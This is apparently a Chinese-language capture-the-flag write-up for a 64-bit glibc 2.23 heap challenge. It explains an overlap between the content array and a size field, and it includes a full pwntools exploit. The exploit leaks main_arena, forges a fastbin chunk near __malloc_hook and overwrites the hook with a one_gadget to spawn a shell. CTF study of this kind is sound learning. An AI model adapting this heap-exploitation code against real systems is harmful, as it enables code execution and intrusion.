## bugkuheap1-fixed

#### 总述

这道题目是64位，没开pie，经典的乌班图2.23版本。最核心的漏洞是在控制块中content数组的最后一位和size的第一位重合了，即意味着我们申请的块8的content会覆盖掉我们块0的size，这时我们就有了超级的溢出能力。

#### 思路

其实说起来并不难，总的来说就是先通过溢出和show泄露出一个unsorted_bin中第一个块的fd，也就是main_arena - 0x58，通过这个泄露值，我们就可以得到我们的libcbase和malloc_hook地址，然后我们在我们的经典位置也就是malloc_hook - 0x23的位置通过伪造fastbin申请出一个块。然后把我们的gadget覆盖到malloc_hook的位置，之后实行触发

#### EXP

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwn_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

p = process('./pwn_patched')
#p = remote('171.80.2.169','18654')
context.terminal = ['tmux', 'splitw', '-h']
context(os='linux', arch='amd64', log_level='debug')
def add(index,size,data):
    p.sendlineafter('Enter your choice: ',b'1')
    p.sendlineafter('index ',str(index).encode())
    p.sendlineafter('bytes): ',str(size).encode())
    p.sendafter('Enter data: ',data)

def edit(index,data):
    p.sendlineafter('Enter your choice: ',b'2')
    p.sendlineafter('index ',str(index).encode())
    p.sendafter('new data: ',data)

def free(index):
    p.sendlineafter('Enter your choice: ',b'3')
    p.sendlineafter('index ',str(index).encode())

def show(index):
    p.sendlineafter('Enter your choice: ',b'4')
    p.sendlineafter('index ',str(index).encode())

#要开始咯
#gdb.attach(p,'c')
add(0,0x20,b'a'*0x20)#0
add(1,0x60,b'b'*0x60)#1
add(2,0x60,b'c'*0x60)#2
add(3,0x60,b'a'*0x60)#3
add(4,0x20,b'a'*0x20)#4
add(5,0x20,b'a'*0x20)#5
add(8,0x20,p64(0x900))#8
payload = b'a' *0x20 + p64(0) + p64(0x71) + b'b' * 0x60 + p64(0) + p64(0x71)+ b'c'* 0x60 + p64(0) + p64(0xa1)
edit(0,payload)
free(3)
show(0)
payload1 = b'c'*0x10f + b'X'
edit(0,payload1)
show(0)
p.recvuntil(b'X')
main_arena = u64(p.recv(6).ljust(8,b'\x00')) - 88
print('main_arena = '+ hex(main_arena))
malloc_hook = main_arena - 0x10
print('malloc_hook = ' + hex(malloc_hook))
payload = b'a' *0x20 + p64(0) + p64(0x71) + b'b' * 0x60 + p64(0) + p64(0x71)+ b'c'* 0x60 + p64(0) + p64(0x71)
edit(0,payload)
free(1)
payload = b'a' * 0x20 + p64(0) + p64(0x71) + p64(malloc_hook - 0x23)
edit(0,payload)
print('malloc_hook - 0x23 = ' + hex(malloc_hook - 0x23))
add(6,0x60,b'e'*0x60)
libc_base = malloc_hook - libc.symbols['__malloc_hook']
gadget = 0x4527a + libc_base
print('gadget = ' + hex(gadget))
realloc_addr = libc_base + libc.sym['realloc']
payload = b'a' * 0x13 + p64(gadget)
payload_hook = b'a' * 11 + p64(gadget) + p64(realloc_addr + 2)
add(1,0x60,payload_hook)
p.sendlineafter(b'Enter your choice: ', b'1')
p.sendlineafter(b'index ', b'7')
p.sendlineafter(b'bytes): ', b'32') # 输入完大小按下回车的一瞬间，malloc 触发，shell 弹出！

# 不要再 send 任何 data 了，直接交接控制权！
print("[*] Boom! Sending interactive...")
p.interactive()
#这里我们就开始考虑进行malloc_hook,伪造地址吧
'''
payload = b'a' * 0x20 + p64(0) + p64(0x31) + b'b' * 0x20 + p64(0) + p64(0x31) + b'c' * 0x20 + p64(0) +p64(0x71)+ b'd' * 0x20 + p64(0) +p64(0x31)+ b'e' * 0x20 + p64(0) +p64(0x61)+ b'f' * 0x20 + p64(0) +p64(0x31)
edit(0,payload)
free(5)
free(3)
payload = b'a' * 0x20 + p64(0) + p64(0x31) + b'b' * 0x20 + p64(0) + p64(0x31) + b'c' * 0x20 + p64(0) +p64(0x71) + p64(malloc_hook - 0x23)
edit(0,payload)
add(5,0x60,b'a'*0x60)
add(3,0x60,b'b'*0x60)
print('malloc_hook = ' + hex(malloc_hook))
pause()
'''
#p.interactive()

#偏移时0x80
```

#### 总结

1，有些有趣的是这个块申请机制(`_int_malloc` 函数)，在申请块时会先在fastbin中找,然后会在smallbin中找，最后在unsortedbin中找，我们把一个原本在unsortedbin中的一个块的size伪造成一个本应在fastbin的块的大小时，我们申请时居然会从unsortedbin中申请出来，有些意思